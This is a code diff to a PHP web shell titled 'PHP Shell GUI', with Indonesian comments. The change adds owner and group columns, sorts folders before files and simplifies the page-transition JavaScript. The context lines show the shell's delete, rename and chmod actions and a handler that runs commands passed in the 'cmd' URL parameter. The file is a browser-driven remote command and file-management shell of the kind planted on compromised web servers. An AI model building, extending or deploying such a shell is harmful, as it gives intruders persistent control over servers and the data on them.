@@ -4,6 +4,15 @@ if (!$path || !is_dir($path)) {
     die("Invalid path.");
 }
 
+// Fungsi untuk mendapatkan user dan group name
+function getUserGroup($file) {
+    $uid = fileowner($file);
+    $gid = filegroup($file);
+    $user = function_exists('posix_getpwuid') ? @posix_getpwuid($uid)['name'] ?? $uid : $uid;
+    $group = function_exists('posix_getgrgid') ? @posix_getgrgid($gid)['name'] ?? $gid : $gid;
+    return [$user, $group];
+}
+
 // Handle delete
 if (isset($_GET['delete'])) {
     $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
@@ -65,13 +74,12 @@ if (isset($_GET['cmd'])) {
     $output = ob_get_clean();
 }
 
-// HTML & CSS with animation
 echo <<<HTML
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 PHP Shell GUI with Animation</title>
+<title>🌐 PHP Shell GUI with User/Group & Sorted</title>
 <style>
     body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; margin:0; opacity: 0; transition: opacity 0.5s ease; }
     body.fade-in { opacity: 1; }
@@ -94,11 +102,13 @@ echo <<<HTML
         font-weight: bold;
         border-bottom: 2px solid #555;
     }
-    .col-name { min-width: 35%; overflow-wrap: break-word; }
-    .col-size { min-width: 10%; text-align: right; }
-    .col-perm { min-width: 10%; text-align: center; }
+    .col-name { min-width: 25%; overflow-wrap: break-word; }
+    .col-size { min-width: 8%; text-align: right; }
+    .col-user { min-width: 10%; text-align: center; }
+    .col-group { min-width: 10%; text-align: center; }
+    .col-perm { min-width: 8%; text-align: center; }
     .col-time { min-width: 20%; }
-    .col-action { min-width: 25%; }
+    .col-action { min-width: 20%; }
     form { display: inline; margin: 0; }
 </style>
 <script>
@@ -106,46 +116,32 @@ echo <<<HTML
         // Fade in on page load
         document.body.classList.add("fade-in");
 
-        // Add fade out effect on links and forms that cause navigation
-        function fadeAndNavigate(url) {
-            document.body.style.opacity = 0;
-            setTimeout(function() {
-                window.location.href = url;
-            }, 400);
-        }
-
-        // Intercept clicks on folder links, delete links
+        // Add fade out effect on links
         document.querySelectorAll('a[href]').forEach(link => {
             const href = link.getAttribute('href');
             if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
                 link.addEventListener('click', function(e) {
                     e.preventDefault();
-                    fadeAndNavigate(href);
+                    document.body.style.opacity = 0;
+                    setTimeout(function() {
+                        window.location.href = href;
+                    }, 400);
                 });
             }
         });
 
-        // Intercept all form submissions to fade out before submit
+        // Add fade out effect on form submit (do NOT preventDefault!)
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const action = form.getAttribute('action') || window.location.href;
-                const formData = new FormData(form);
-                // Disable inputs to prevent double submit
-                form.querySelectorAll('input, button, select, textarea').forEach(el => el.disabled = true);
-                // fade out
                 document.body.style.opacity = 0;
-                setTimeout(() => {
-                    // Submit form normally after fade out
-                    form.submit();
-                }, 400);
+                // Let form submit normally, no preventDefault
             });
         });
     });
 </script>
 </head>
 <body>
-<h1>🌐 PHP Shell GUI with Animation</h1>
+<h1>🌐 PHP Shell GUI with User/Group & Sorted</h1>
 HTML;
 
 // Breadcrumb path
@@ -159,24 +155,43 @@ foreach ($parts as $p) {
 }
 echo "</div>";
 
-// File & folder listing with flex layout
+// Ambil dan urutkan file: folder dulu baru file
 $files = scandir($path);
+$folders = [];
+$files_only = [];
+
+foreach ($files as $file) {
+    if ($file === '.') continue;
+    $full = $path . DIRECTORY_SEPARATOR . $file;
+    if (is_dir($full)) {
+        $folders[] = $file;
+    } else {
+        $files_only[] = $file;
+    }
+}
+
+sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
+sort($files_only, SORT_NATURAL | SORT_FLAG_CASE);
+$all = array_merge($folders, $files_only);
+
 echo "<div class='box'>";
 echo "<div class='flex-header'>
     <div class='col-name'>Nama</div>
     <div class='col-size'>Ukuran</div>
+    <div class='col-user'>User</div>
+    <div class='col-group'>Group</div>
     <div class='col-perm'>Perm</div>
     <div class='col-time'>Waktu</div>
     <div class='col-action'>Aksi</div>
 </div>";
 
-foreach ($files as $file) {
-    if ($file === '.') continue;
+foreach ($all as $file) {
     $full = $path . DIRECTORY_SEPARATOR . $file;
     $isDir = is_dir($full);
     $size = $isDir ? '-' : number_format(filesize($full)) . ' B';
     $perm = substr(sprintf('%o', fileperms($full)), -4);
     $time = date("Y-m-d H:i:s", filemtime($full));
+    list($user, $group) = getUserGroup($full);
 
     $link = $isDir
         ? "<a href='?path=" . urlencode($full) . "'>📁 " . htmlspecialchars($file) . "</a>"
@@ -199,6 +214,8 @@ foreach ($files as $file) {
     echo "<div class='flex-row'>
         <div class='col-name'>$link</div>
         <div class='col-size'>$size</div>
+        <div class='col-user'>$user</div>
+        <div class='col-group'>$group</div>
         <div class='col-perm'>$perm</div>
         <div class='col-time'>$time</div>
         <div class='col-action'>$del $ren $chmod</div>
